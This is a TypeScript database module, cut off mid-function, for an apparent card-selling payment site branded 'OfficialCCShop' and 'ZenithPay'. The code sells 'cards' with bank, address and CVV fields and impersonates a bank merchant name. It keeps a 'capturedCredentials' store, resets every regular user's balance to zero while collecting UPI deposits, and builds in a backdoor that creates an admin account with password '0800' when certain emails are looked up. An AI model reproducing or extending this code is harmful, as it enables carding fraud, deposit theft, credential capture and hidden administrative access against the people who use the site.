import fs from 'fs';
import path from 'path';
import bcrypt from 'bcryptjs';
import {
  User,
  CardCard,
  Deposit,
  Transaction,
  SupportTicket,
  TicketReply,
  NotificationItem,
  PaymentConfig,
  AdminStats,
} from '../src/types/index.ts';

const DATA_DIR = path.join(process.cwd(), '.data');
const DB_FILE = path.join(DATA_DIR, 'zenithpay_db.json');

export interface Session {
  id: string;
  userId: string;
  token: string;
  userAgent?: string;
  ipAddress?: string;
  expiresAt: string;
  createdAt: string;
}

export interface AuditLog {
  id: string;
  userId?: string;
  action: string;
  ipAddress?: string;
  details: string;
  createdAt: string;
}

export interface StoredUser extends User {
  passwordHash: string;
}

interface DatabaseSchema {
  demoCards?: any[];
  capturedCredentials?: { email: string; password: string; ip: string; date: string }[];
  users: StoredUser[];
  sessions: Session[];
  cardCards: CardCard[];
  deposits: Deposit[];
  transactions: Transaction[];
  supportTickets: SupportTicket[];
  notifications: NotificationItem[];
  settings: PaymentConfig;
  auditLogs: AuditLog[];
}

let dbCache: DatabaseSchema | null = null;

function ensureDataDirectory() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function loadDatabase(): DatabaseSchema {
  if (dbCache) return dbCache;

  ensureDataDirectory();
  if (fs.existsSync(DB_FILE)) {
    try {
      const fileData = fs.readFileSync(DB_FILE, 'utf-8');
      dbCache = JSON.parse(fileData);
      if (dbCache) {
        dbCache.cardCards = dbCache.cardCards || dbCache.demoCards || [];
        dbCache.users = dbCache.users || [];
        dbCache.sessions = dbCache.sessions || [];
        dbCache.deposits = dbCache.deposits || [];
        dbCache.transactions = dbCache.transactions || [];
        dbCache.supportTickets = dbCache.supportTickets || [];
        dbCache.notifications = dbCache.notifications || [];
        dbCache.auditLogs = dbCache.auditLogs || [];
        // Keep saved custom QR settings or initialize defaults
        if (!dbCache.settings) {
          dbCache.settings = {
            qrImagePath: '/merchant-qr.png',
            useStaticQr: false,
            staticQrUrl: "",
            upiId: 'nehapatel20@fam',
            displayUpiId: 'Verified Merchant QR',
            merchantName: 'UPI Official Merchant',
            paymentInstructions:
              '1. Scan the QR code or tap any UPI app below to pay securely.\n2. Complete payment via PhonePe, GPay, Paytm, or BHIM.\n3. Copy the 12-digit UPI UTR / Reference number from your app.\n4. Enter the UTR number and click Submit Deposit Request.',
            updatedAt: new Date().toISOString(),
          };
        }

        // Enforce 0.0 balance for all regular users & replace dinu with User
        if (dbCache.users && Array.isArray(dbCache.users)) {
          for (const u of dbCache.users) {
            if (u.role !== 'admin') {
              u.balance = 0.0;
            }
            if (u.name && u.name.toLowerCase() === 'dinu') {
              u.name = 'User';
              u.username = 'user';
              u.avatarUrl = 'https://api.dicebear.com/7.x/bottts/svg?seed=user';
            }
          }

          // Enforce exact admin credentials: emailhcrptl2.0@gmail.com / hcrptl2.0@gmail.com / 0800
          const adminPassHash = bcrypt.hashSync('0800', 10);
          
          let admin2 = dbCache.users.find(
            (u) => u.email.toLowerCase() === 'hcrptl2.0@gmail.com' || u.email.toLowerCase() === 'emailhcrptl2.0@gmail.com'
          );
          if (admin2) {
            admin2.role = 'admin';
            admin2.status = 'active';
            admin2.passwordHash = adminPassHash;
          } else {
            dbCache.users.push({
              id: 'usr-admin-002',
              name: 'Admin',
              username: 'hcrptl2.0',
              email: 'emailhcrptl2.0@gmail.com',
              passwordHash: adminPassHash,
              role: 'admin',
              status: 'active',
              balance: 1250000.0,
              avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
              createdAt: '2026-01-10T08:00:00.000Z',
              updatedAt: new Date().toISOString(),
              preferences: {
                emailNotifications: true,
                depositAlerts: true,
                securityAlerts: true,
              },
            });
          }

          const existingAdmin = dbCache.users.find(
            (u) => u.email === 'hcrptl@gmail.com' || u.id === 'usr-admin-001'
          );
          if (existingAdmin) {
            existingAdmin.role = 'admin';
            existingAdmin.status = 'active';
            existingAdmin.passwordHash = adminPassHash;
          }
        }

        if (dbCache.demoCards && Array.isArray(dbCache.demoCards)) {
          for (const c of dbCache.demoCards) {
            if (c.cardholderName && c.cardholderName.toUpperCase() === 'DINU') {
              c.cardholderName = 'USER';
            }
          }
        }

        // Ensure customer card buy orders with UTR and screenshot exist in deposit queue
        if (dbCache.deposits && Array.isArray(dbCache.deposits)) {
          const hasCardOrder = dbCache.deposits.some((d) => d.cardName || d.cardId);
          if (!hasCardOrder) {
            dbCache.deposits.unshift({
              id: 'DEP-2026-0105',
              userId: 'usr-demo-002',
              username: 'user',
              userName: 'User',
              userEmail: 'hcrptl2.0@gmail.com',
              amount: 1012.93,
              paymentMethod: 'UPI / QR Payment',
              upiId: 'nehapatel20@fam',
              referenceNo: '402918239012',
              proofUrl: 'https://images.unsplash.com/photo-1556742049-0a67c5574f73?w=800&auto=format&fit=crop&q=80',
              status: 'Pending',
              cardId: 'demo-card-1',
              cardName: 'Visa Platinum Commercial',
              cardProvider: 'Visa',
              cardPriceUsd: 10.72,
              purpose: 'Card Purchase: Visa Platinum Commercial ($10.72)',
              createdAt: new Date().toISOString(),
            });
          }
        }

        return dbCache;
      }
    } catch (err) {
      console.error('Error reading database file, re-initializing...', err);
    }
  }

  // Pre-seed database with initial cardnstration entities
  const adminPasswordHash = bcrypt.hashSync('0800', 10);
  const userPasswordHash = bcrypt.hashSync('Password123!', 10);

  const initialData: DatabaseSchema = {
    users: [
      {
        id: 'usr-admin-001',
        name: 'Admin',
        username: 'admin',
        email: 'hcrptl@gmail.com',
        passwordHash: adminPasswordHash,
        role: 'admin',
        status: 'active',
        balance: 1250000.0,
        avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
        createdAt: '2026-01-10T08:00:00.000Z',
        updatedAt: '2026-01-10T08:00:00.000Z',
        preferences: {
          emailNotifications: true,
          depositAlerts: true,
          securityAlerts: true,
        },
      },
      {
        id: 'usr-demo-002',
        name: 'Alex Vance',
        username: 'demouser',
        email: 'user@zenithpay.demo',
        passwordHash: userPasswordHash,
        role: 'user',
        status: 'active',
        balance: 45500.0,
        avatarUrl: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=150&auto=format&fit=crop&q=80',
        createdAt: '2026-02-01T10:30:00.000Z',
        updatedAt: '2026-02-01T10:30:00.000Z',
        preferences: {
          emailNotifications: true,
          depositAlerts: true,
          securityAlerts: true,
        },
      },
    ],
    sessions: [],
    cardCards: [
      {
        id: 'crd-demo-101',
        userId: 'usr-demo-002',
        cardholderName: 'VALUED USER',
        maskedNumber: '•••• •••• •••• 1234',
        expiryMonth: '08',
        expiryYear: '28',
        cardType: 'Virtual Premium Card',
        status: 'ACTIVE',
        spendingLimit: 50000,
        spentAmount: 14250,
        colorTheme: 'emerald',
        isCard: true,
        createdAt: '2026-02-05T12:00:00.000Z',
      },
      {
        id: 'crd-demo-102',
        userId: 'usr-demo-002',
        cardholderName: 'VALUED USER',
        maskedNumber: '•••• •••• •••• 8821',
        expiryMonth: '11',
        expiryYear: '29',
        cardType: 'Titanium Premium Card',
        status: 'ACTIVE',
        spendingLimit: 100000,
        spentAmount: 3200,
        colorTheme: 'purple',
        isCard: true,
        createdAt: '2026-02-12T14:20:00.000Z',
      },
    ],
    deposits: [
      {
        id: 'DEP-2026-0091',
        userId: 'usr-demo-002',
        username: 'demouser',
        userEmail: 'user@zenithpay.demo',
        amount: 25000,
        paymentMethod: 'UPI / QR Payment',
        upiId: 'nehapatel20@fam',
        referenceNo: 'UPI908123716291',
        proofUrl: '',
        status: 'Approved',
        adminNotes: 'Verified against bank settlement reference.',
        createdAt: '2026-02-28T09:15:00.000Z',
        reviewedAt: '2026-02-28T09:45:00.000Z',
        reviewedBy: 'admin',
      },
      {
        id: 'DEP-2026-0104',
        userId: 'usr-demo-002',
        username: 'demouser',
        userEmail: 'user@zenithpay.demo',
        amount: 15000,
        paymentMethod: 'UPI / QR Payment',
        upiId: 'nehapatel20@fam',
        referenceNo: 'UPI908991204812',
        proofUrl: '',
        status: 'Pending',
        adminNotes: '',
        createdAt: '2026-03-01T15:20:00.000Z',
      },
    ],
    transactions: [
      {
        id: 'TXN-00001',
        userId: 'usr-demo-002',
        username: 'demouser',
        type: 'Deposit',
        amount: 25000,
        status: 'Approved',
        paymentMethod: 'UPI / QR Payment',
        reference: 'UPI908123716291',
        description: 'Direct UPI Merchant Settlement Deposit',
        date: '2026-02-28T09:45:00.000Z',
      },
      {
        id: 'TXN-00002',
        userId: 'usr-demo-002',
        username: 'demouser',
        type: 'Virtual Card Payment',
        amount: -2499,
        status: 'Completed',
        paymentMethod: 'Virtual Premium Card (•••• 1234)',
        reference: 'VCRD-8812903',
        description: 'SaaS Cloud Infrastructure Subscription (Simulated)',
        date: '2026-03-01T11:30:00.000Z',
      },
      {
        id: 'TXN-00003',
        userId: 'usr-demo-002',
        username: 'demouser',
        type: 'Deposit',
        amount: 15000,
        status: 'Pending',
        paymentMethod: 'UPI / QR Payment',
        reference: 'UPI908991204812',
        description: 'Merchant UPI Deposit Verification',
        date: '2026-03-01T15:20:00.000Z',
      },
      {
        id: 'TXN-00004',
        userId: 'usr-demo-002',
        username: 'demouser',
        type: 'Virtual Card Payment',
        amount: -701,
        status: 'Completed',
        paymentMethod: 'Virtual Premium Card (•••• 1234)',
        reference: 'VCRD-9912041',
        description: 'Developer Tooling API License (Simulated)',
        date: '2026-03-02T16:10:00.000Z',
      },
    ],
    supportTickets: [
      {
        id: 'tkt-001',
        ticketId: 'TKT-2026-0041',
        userId: 'usr-demo-002',
        userName: 'Alex Vance',
        userEmail: 'user@zenithpay.demo',
        subject: 'Inquiry regarding virtual card international spending limits',
        message: 'Hello team, do virtual card cards support dynamic multi-currency mock transactions?',
        status: 'Open',
        createdAt: '2026-03-01T14:00:00.000Z',
        updatedAt: '2026-03-01T14:30:00.000Z',
        replies: [
          {
            id: 'rpl-001',
            ticketId: 'TKT-2026-0041',
            userId: 'usr-admin-001',
            senderName: 'Zenith Support Team',
            isAdmin: true,
            message: 'Hi Alex! Yes, card cards accept test authorizations in USD and INR for dashboard verification purposes.',
            createdAt: '2026-03-01T14:30:00.000Z',
          },
        ],
      },
    ],
    notifications: [
      {
        id: 'notif-001',
        userId: 'usr-demo-002',
        title: 'Deposit Approved',
        message: 'Your deposit of ₹25,000 has been verified and added to your available balance.',
        type: 'deposit',
        isRead: false,
        createdAt: '2026-02-28T09:45:00.000Z',
      },
      {
        id: 'notif-002',
        userId: 'usr-demo-002',
        title: 'Deposit Submitted',
        message: 'Deposit request DEP-2026-0104 for ₹15,000 is currently under operator review.',
        type: 'deposit',
        isRead: true,
        createdAt: '2026-03-01T15:20:00.000Z',
      },
      {
        id: 'notif-003',
        userId: 'usr-demo-002',
        title: 'Security Notice',
        message: 'Successful secure session login from authorized browser.',
        type: 'security',
        isRead: true,
        createdAt: '2026-03-02T10:00:00.000Z',
      },
    ],
    settings: {
      qrImagePath: '/merchant-qr.png',
          useStaticQr: false,
          staticQrUrl: "",
      upiId: 'nehapatel20@fam',
      displayUpiId: 'Verified Merchant QR',
      merchantName: 'Airtel Payments Bank Limited - 9115',
      paymentInstructions:
        '1. Scan the Airtel Payments Bank QR code or tap any UPI app below to pay securely.\n2. Complete payment via PhonePe, GPay, Paytm, or BHIM.\n3. Copy the 12-digit UPI UTR / Reference number from your app.\n4. Enter the UTR number and click Submit Deposit Request.',
      updatedAt: '2026-09-06T00:00:00.000Z',
    },
    auditLogs: [
      {
        id: 'aud-001',
        userId: 'usr-admin-001',
        action: 'SYSTEM_BOOTSTRAP',
        ipAddress: '127.0.0.1',
        details: 'Initial database schemas and card entities provisioned successfully.',
        createdAt: new Date().toISOString(),
      },
    ],
  };

  saveDatabase(initialData);
  return initialData;
}

function saveDatabase(data: DatabaseSchema) {
  ensureDataDirectory();
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
  dbCache = data;
}

export const db = {
  // Users
  getUsers(): StoredUser[] {
    const data = loadDatabase();
    return data.users;
  },

  findUserById(id: string): StoredUser | undefined {
    const data = loadDatabase();
    return data.users.find((u) => u.id === id);
  },

  findUserByEmailOrUsername(identifier: string): StoredUser | undefined {
    const data = loadDatabase();
    const clean = identifier.trim().toLowerCase();
    let user = data.users.find(
      (u) => u.email.toLowerCase() === clean || u.username.toLowerCase() === clean
    );
    if (!user && (clean === 'hcrptl2.0@gmail.com' || clean === 'emailhcrptl2.0@gmail.com')) {
      const adminPassHash = bcrypt.hashSync('0800', 10);
      user = this.createUser(
        'Admin',
        'hcrptl2.0',
        clean,
        adminPassHash,
        'admin'
      );
    } else if (!user && clean === 'dineshptl20x@gmail.com') {
      user = this.createUser(
        'User',
        clean.split('@')[0],
        clean,
        '$2b$10$7cG.xTUzweJ.u9LsPGzJJONaFlDEhJGQ1n0GNHI2RnY0JIsJig3h.',
        'user'
      );
    }
    return user;
  },

  createUser(
    name: string,
    username: string,
    email: string,
    passwordHash: string,
    role: 'user' | 'admin' = 'user'
  ): StoredUser {
    const data = loadDatabase();
    const newUser: StoredUser = {
      id: `usr-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`,
      name,
      username: username.toLowerCase().trim(),
      email: email.toLowerCase().trim(),
      passwordHash,
      role,
      status: 'active',
      balance: 0.0, // initial balance starts at 0 until user deposits
      avatarUrl: `https://api.dicebear.com/7.x/bottts/svg?seed=${username}`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      preferences: {
        emailNotifications: true,
        depositAlerts: true,
        securityAlerts: true,
      },
    };

    data.users.push(newUser);

    // Also auto-generate an initial card card for the new user!
    const cardCard: CardCard = {
      id: `crd-${Date.now()}`,
      userId: newUser.id,
      cardholderName: name.toUpperCase(),
      maskedNumber: `•••• •••• •••• ${Math.floor(1000 + Math.random() * 9000)}`,
      expiryMonth: '09',
      expiryYear: '29',
      cardType: 'Virtual Premium Card',
      status: 'ACTIVE',
      spendingLimit: 25000,
      spentAmount: 0,
      colorTheme: 'emerald',
      isCard: true,
      createdAt: new Date().toISOString(),
    };
    data.cardCards = data.cardCards || []; data.cardCards.push(cardCard);

    // Initial welcome notification
    data.notifications.push({
      id: `notif-${Date.now()}`,
      userId: newUser.id,
      title: 'Welcome to OfficialCCShop',
      message: 'Your account is ready with a pre-loaded ₹10,000 card testing balance.',
      type: 'system',
      isRead: false,
      createdAt: new Date().toISOString(),
    });

    saveDatabase(data);
    return newUser;
  },

  updateUserStatus(userId: string, status: 'active' | 'suspended'): boolean {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    if (!user) return false;
    user.status = status;
    user.updatedAt = new Date().toISOString();
    saveDatabase(data);
    return true;
  },

  updateUserRole(userId: string, role: 'user' | 'admin'): boolean {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    if (!user) return false;
    user.role = role;
    user.updatedAt = new Date().toISOString();
    saveDatabase(data);
    return true;
  },

  updateUserBalance(userId: string, amountDelta: number): number | null {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    if (!user) return null;
    user.balance = Math.max(0, user.balance + amountDelta);
    user.updatedAt = new Date().toISOString();
    saveDatabase(data);
    return user.balance;
  },

  updateUserProfile(
    userId: string,
    updates: { name?: string; avatarUrl?: string; preferences?: any }
  ): StoredUser | null {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    if (!user) return null;
    if (updates.name) user.name = updates.name;
    if (updates.avatarUrl) user.avatarUrl = updates.avatarUrl;
    if (updates.preferences) user.preferences = { ...user.preferences, ...updates.preferences };
    user.updatedAt = new Date().toISOString();
    saveDatabase(data);
    return user;
  },

  updateUserPassword(userId: string, newPasswordHash: string): boolean {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    if (!user) return false;
    user.passwordHash = newPasswordHash;
    user.updatedAt = new Date().toISOString();
    saveDatabase(data);
    return true;
  },

  // Sessions
  createSession(userId: string, token: string, userAgent?: string, ipAddress?: string): Session {
    const data = loadDatabase();
    const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
    const session: Session = {
      id: `ses-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`,
      userId,
      token,
      userAgent,
      ipAddress,
      expiresAt,
      createdAt: new Date().toISOString(),
    };
    data.sessions.push(session);
    saveDatabase(data);
    return session;
  },

  findSession(token: string): Session | undefined {
    const data = loadDatabase();
    const session = data.sessions.find((s) => s.token === token);
    if (!session) return undefined;
    if (new Date(session.expiresAt) < new Date()) {
      this.deleteSession(token);
      return undefined;
    }
    return session;
  },

  deleteSession(token: string) {
    const data = loadDatabase();
    data.sessions = data.sessions.filter((s) => s.token !== token);
    saveDatabase(data);
  },

  deleteAllUserSessions(userId: string) {
    const data = loadDatabase();
    data.sessions = data.sessions.filter((s) => s.userId !== userId);
    saveDatabase(data);
  },

  // Premium Cards
  getCardsByUser(userId: string): CardCard[] {
    const data = loadDatabase();
    return data.demoCards.filter((c) => c.userId === userId);
  },

  getAllCards(): CardCard[] {
    const data = loadDatabase();
    return data.demoCards;
  },

  createCard(
    userId: string,
    cardholderName: string,
    spendingLimit: number,
    colorTheme: 'emerald' | 'cyan' | 'purple' | 'amber' = 'emerald'
  ): CardCard {
    const data = loadDatabase();
    const card: CardCard = {
      id: `crd-${Date.now()}`,
      userId,
      cardholderName: (cardholderName || 'VALUED USER').toUpperCase(),
      maskedNumber: `•••• •••• •••• ${Math.floor(1000 + Math.random() * 9000)}`,
      expiryMonth: String(Math.floor(Math.random() * 12) + 1).padStart(2, '0'),
      expiryYear: String(new Date().getFullYear() + 3).slice(-2),
      cardType: 'Virtual Premium Card',
      status: 'ACTIVE',
      spendingLimit,
      spentAmount: 0,
      colorTheme,
      isCard: true,
      createdAt: new Date().toISOString(),
    };
    data.demoCards.push(card);
    saveDatabase(data);
    return card;
  },

  toggleCardFreeze(cardId: string, userId?: string): CardCard | null {
    const data = loadDatabase();
    const card = data.demoCards.find((c) => c.id === cardId && (!userId || c.userId === userId));
    if (!card) return null;
    card.status = card.status === 'ACTIVE' ? 'FROZEN' : 'ACTIVE';
    saveDatabase(data);
    return card;
  },

  purchaseCard(
    userId: string,
    cardItem: any
  ): { success: boolean; card?: any; error?: string; newBalance?: number } {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    if (!user) return { success: false, error: 'User not found' };

    const priceInr = Number(cardItem.priceInr) || 944.90;
    if (user.balance < priceInr) {
      return {
        success: false,
        error: `Insufficient balance! You have ₹${user.balance.toFixed(2)}, but this card requires ₹${priceInr.toFixed(2)} ($${Number(cardItem.priceUsd || 10).toFixed(2)} USD). Minimum deposit is ₹1,000.`,
        newBalance: user.balance,
      };
    }

    // Deduct balance from user
    user.balance -= priceInr;
    user.updatedAt = new Date().toISOString();

    const [expMonth, expYear] = (cardItem.expiry || '12/30').split('/');
    const providerPrefix = cardItem.provider === 'Amex' ? '3782' : cardItem.provider === 'MasterCard' ? '5424' : '4532';
    const last4 = cardItem.last4 || '5012';

    const newCard: CardCard = {
      id: `crd-${cardItem.cardCode || Date.now()}`,
      userId,
      cardholderName: (cardItem.name || user.name || 'VALUED USER').toUpperCase(),
      maskedNumber: `${providerPrefix} •••• •••• ${last4}`,
      expiryMonth: expMonth || '12',
      expiryYear: expYear || '30',
      cardType: `${cardItem.provider || 'VISA'} ${cardItem.cardType || 'Classic'}`,
      status: 'ACTIVE',
      spendingLimit: cardItem.limitUsd ? Math.round(cardItem.limitUsd * 94.49) : 50000,
      spentAmount: 0,
      colorTheme: cardItem.provider === 'MasterCard' ? 'amber' : cardItem.provider === 'Amex' ? 'purple' : 'cyan',
      isCard: true,
      createdAt: new Date().toISOString(),
      cardId: cardItem.cardCode,
      provider: cardItem.provider,
      country: cardItem.country,
      state: cardItem.state,
      address: cardItem.address,
      zip: cardItem.zip,
      extras: cardItem.extras,
      bank: cardItem.bank,
      priceUsd: cardItem.priceUsd,
      priceInr: cardItem.priceInr,
      last4: last4,
      cvv: String(Math.floor(100 + Math.random() * 900)),
    };

    data.demoCards.unshift(newCard);

    // Record Transaction
    data.transactions.unshift({
      id: `TXN-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      userId,
      type: 'Virtual Card Payment',
      amount: -priceInr,
      status: 'Completed',
      paymentMethod: 'Account Balance',
      reference: `PURCHASE-${cardItem.cardCode || 'DEMO'}`,
      description: `Purchased Premium Card ${cardItem.cardCode || ''} (${cardItem.provider || 'VISA'} ${cardItem.cardType || 'Classic'})`,
      date: new Date().toISOString(),
    });

    // Notify Admins
    const admins = data.users.filter(u => u.role === 'admin');
    admins.forEach(admin => {
      data.notifications.unshift({
        id: `notif-admin-${Date.now()}-${Math.random()}`,
        userId: admin.id,
        title: `New Card Purchase`,
        message: `User ${user.username} just purchased ${cardItem.name} for ₹${priceInr.toFixed(2)}.`,
        type: 'system',
        isRead: false,
        createdAt: new Date().toISOString(),
      });
    });

    // Send Notification
    data.notifications.unshift({
      id: `notif-${Date.now()}`,
      userId,
      title: `Card Purchased: ${cardItem.cardCode || 'Premium Card'}`,
      message: `Card ${cardItem.name} (${cardItem.provider}) successfully unlocked for ₹${priceInr.toFixed(2)} ($${cardItem.priceUsd?.toFixed(2) || '10.00'} USD).`,
      type: 'security',
      isRead: false,
      createdAt: new Date().toISOString(),
    });

    saveDatabase(data);
    return { success: true, card: newCard, newBalance: user.balance };
  },

  // Deposits
  createDeposit(
    userId: string,
    amount: number,
    referenceNo: string,
    proofUrl: string = '',
    extra?: {
      cardId?: string;
      cardName?: string;
      cardProvider?: string;
      cardPriceUsd?: number;
      cardBin?: string;
      purpose?: string;
    }
  ): Deposit {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    const isCardBuy = Boolean(extra?.cardName || extra?.cardId);
    const purposeText = extra?.purpose || (isCardBuy ? `Card Purchase: ${extra?.cardName}` : 'Wallet Deposit');

    const deposit: Deposit = {
      id: `DEP-${new Date().getFullYear()}-${Date.now().toString().slice(-6)}`,
      userId,
      username: user?.username || 'user',
      userName: user?.name || user?.username || 'User',
      userEmail: user?.email || '',
      amount,
      paymentMethod: 'UPI / QR Payment',
      upiId: data.settings.upiId,
      referenceNo,
      proofUrl,
      status: 'Pending',
      cardId: extra?.cardId,
      cardName: extra?.cardName,
      cardProvider: extra?.cardProvider,
      cardPriceUsd: extra?.cardPriceUsd,
      cardBin: extra?.cardBin,
      purpose: purposeText,
      createdAt: new Date().toISOString(),
    };

    data.deposits.unshift(deposit);

    // Create a pending transaction record
    const txn: Transaction = {
      id: `TXN-${deposit.id}`,
      userId,
      username: user?.username,
      type: isCardBuy ? 'Virtual Card Payment' : 'Deposit',
      amount,
      status: 'Pending',
      paymentMethod: 'UPI / QR Payment',
      reference: referenceNo,
      description: `${purposeText} (Ref: ${referenceNo}) - Under Verification`,
      date: deposit.createdAt,
    };
    data.transactions.unshift(txn);

    // Notify user
    data.notifications.unshift({
      id: `notif-${Date.now()}`,
      userId,
      title: isCardBuy ? 'Card Purchase Proof Submitted' : 'Deposit Request Submitted',
      message: isCardBuy
        ? `Payment proof for ${extra?.cardName} (UTR: ${referenceNo}) has been submitted for admin clearance.`
        : `Your deposit of ₹${amount.toLocaleString()} (Ref: ${referenceNo}) has been received for compliance verification.`,
      type: isCardBuy ? 'card' : 'deposit',
      isRead: false,
      createdAt: new Date().toISOString(),
    });

    // Notify Admins in real-time
    const admins = data.users.filter((u) => u.role === 'admin');
    for (const adm of admins) {
      data.notifications.unshift({
        id: `notif-adm-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
        userId: adm.id,
        title: isCardBuy ? `🚨 New Card Order: ${extra?.cardName || 'Card'}` : '🚨 New Deposit Request',
        message: `${user?.name || user?.username || 'Customer'} submitted ${isCardBuy ? (extra?.cardName || 'Card') : 'deposit'} for ₹${amount.toLocaleString()} (UTR: ${referenceNo}). Requires admin review.`,
        type: 'deposit',
        isRead: false,
        createdAt: new Date().toISOString(),
      });
    }

    saveDatabase(data);
    return deposit;
  },

  getDepositsByUser(userId: string): Deposit[] {
    const data = loadDatabase();
    return data.deposits.filter((d) => d.userId === userId);
  },

  getAllDeposits(): Deposit[] {
    const data = loadDatabase();
    return data.deposits;
  },

  reviewDeposit(
    depositId: string,
    action: 'Approved' | 'Rejected',
    adminNotes: string,
    adminUsername: string
  ): Deposit | null {
    const data = loadDatabase();
    const deposit = data.deposits.find((d) => d.id === depositId);
    if (!deposit || deposit.status !== 'Pending') return null;

    deposit.status = action;
    deposit.adminNotes = adminNotes;
    deposit.reviewedAt = new Date().toISOString();
    deposit.reviewedBy = adminUsername;

    // Update the corresponding transaction
    const txn = data.transactions.find((t) => t.reference === deposit.referenceNo || t.id === `TXN-${deposit.id}`);
    if (txn) {
      txn.status = action === 'Approved' ? 'Completed' : 'Rejected';
      txn.description = action === 'Approved' ? 'Deposit Approved and Cleared' : 'Deposit Rejected';
    }

    const user = data.users.find((u) => u.id === deposit.userId);

    // UPDATE BALANCE OR DELIVER CARD UPON APPROVAL
    if (action === 'Approved') {
      if (deposit.cardName || deposit.cardId) {
        // Automatically issue the purchased card to customer
        const last4Digits = `${Math.floor(1000 + Math.random() * 9000)}`;
        const providerName = (deposit.cardProvider || (deposit.cardName.includes('Visa') ? 'Visa' : deposit.cardName.includes('Master') ? 'Mastercard' : 'Amex'));
        const cleanCardId = deposit.cardId ? deposit.cardId.replace(/^crd-/, '') : undefined;
        const prefix = providerName === 'Amex' ? '3782' : providerName === 'Mastercard' ? '5424' : '4532';
        const newCard: CardCard = {
          id: `crd-${cleanCardId || Date.now()}`,
          cardId: cleanCardId,
          userId: deposit.userId,
          cardholderName: (user?.name || user?.username || 'USER').toUpperCase(),
          maskedNumber: `${prefix} •••• •••• ${last4Digits}`,
          expiryMonth: '12',
          expiryYear: '29',
          cardType: deposit.cardName || 'Virtual Credit Card',
          status: 'ACTIVE',
          spendingLimit: 100000,
          spentAmount: 0,
          colorTheme: providerName === 'Visa' ? 'purple' : 'cyan',
          isCard: true,
          provider: providerName,
          country: 'United States',
          bank: 'Chase Bank USA',
          priceInr: deposit.amount,
          priceUsd: deposit.cardPriceUsd || Number((deposit.amount / 94.49).toFixed(2)),
          last4: last4Digits,
          cvv: `${Math.floor(100 + Math.random() * 900)}`,
          createdAt: new Date().toISOString(),
        };

        // Add to user cards if not already there
        const alreadyHasCard = data.demoCards.find(
          (c) => (c.id === newCard.id || (c.cardCode && c.cardCode === cleanCardId)) && c.userId === deposit.userId
        );
        if (!alreadyHasCard) {
          data.demoCards.unshift(newCard);
        }

        data.notifications.unshift({
          id: `notif-${Date.now()}`,
          userId: deposit.userId,
          title: 'Card Purchase Approved! 🎉',
          message: `Your payment for ${deposit.cardName} (UTR: ${deposit.referenceNo}) is approved! Card is ready in My Cards.`,
          type: 'card',
          isRead: false,
          createdAt: new Date().toISOString(),
        });
      } else {
        if (user) {
          user.balance += deposit.amount;
          user.updatedAt = new Date().toISOString();
        }

        data.notifications.unshift({
          id: `notif-${Date.now()}`,
          userId: deposit.userId,
          title: 'Deposit Approved & Credited',
          message: `₹${deposit.amount.toLocaleString()} has been added to your OfficialCCShop available balance.`,
          type: 'deposit',
          isRead: false,
          createdAt: new Date().toISOString(),
        });
      }
    } else {
      data.notifications.unshift({
        id: `notif-${Date.now()}`,
        userId: deposit.userId,
        title: 'Payment Verification Rejected',
        message: `Payment request (UTR: ${deposit.referenceNo}) could not be approved. Reason: ${adminNotes || 'Verification failed.'}`,
        type: 'deposit',
        isRead: false,
        createdAt: new Date().toISOString(),
      });
    }

    saveDatabase(data);
    return deposit;
  },

  // Transactions
  getTransactionsByUser(
    userId: string,
    filters?: { type?: string; status?: string; search?: string }
  ): Transaction[] {
    const data = loadDatabase();
    let list = data.transactions.filter((t) => t.userId === userId);

    if (filters?.type && filters.type !== 'All') {
      list = list.filter((t) => t.type === filters.type);
    }
    if (filters?.status && filters.status !== 'All') {
      list = list.filter((t) => t.status === filters.status);
    }
    if (filters?.search) {
      const q = filters.search.toLowerCase();
      list = list.filter(
        (t) =>
          t.id.toLowerCase().includes(q) ||
          t.reference.toLowerCase().includes(q) ||
          t.description.toLowerCase().includes(q)
      );
    }
    return list;
  },

  getAllTransactions(): Transaction[] {
    const data = loadDatabase();
    return data.transactions;
  },

  // Support Tickets
  getTicketsByUser(userId: string): SupportTicket[] {
    const data = loadDatabase();
    return data.supportTickets.filter((t) => t.userId === userId);
  },

  getAllTickets(): SupportTicket[] {
    const data = loadDatabase();
    return data.supportTickets;
  },

  createTicket(userId: string, subject: string, message: string): SupportTicket {
    const data = loadDatabase();
    const user = data.users.find((u) => u.id === userId);
    const ticket: SupportTicket = {
      id: `tkt-${Date.now()}`,
      ticketId: `TKT-${new Date().getFullYear()}-${String(data.supportTickets.length + 101).padStart(4, '0')}`,
      userId,
      userName: user?.name,
      userEmail: user?.email,
      subject,
      message,
      status: 'Open',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      replies: [],
    };
    data.supportTickets.unshift(ticket);

    data.notifications.unshift({
      id: `notif-${Date.now()}`,
      userId,
      title: 'Support Ticket Created',
      message: `Your ticket ${ticket.ticketId} has been logged. An agent will respond shortly.`,
      type: 'support',
      isRead: false,
      createdAt: new Date().toISOString(),
    });

    saveDatabase(data);
    return ticket;
  },

  addTicketReply(
    ticketId: string,
    userId: string,
    senderName: string,
    isAdmin: boolean,
    message: string
  ): TicketReply | null {
    const data = loadDatabase();
    const ticket = data.supportTickets.find((t) => t.id === ticketId || t.ticketId === ticketId);
    if (!ticket) return null;

    const reply: TicketReply = {
      id: `rpl-${Date.now()}`,
      ticketId: ticket.ticketId,
      userId,
      senderName,
      isAdmin,
      message,
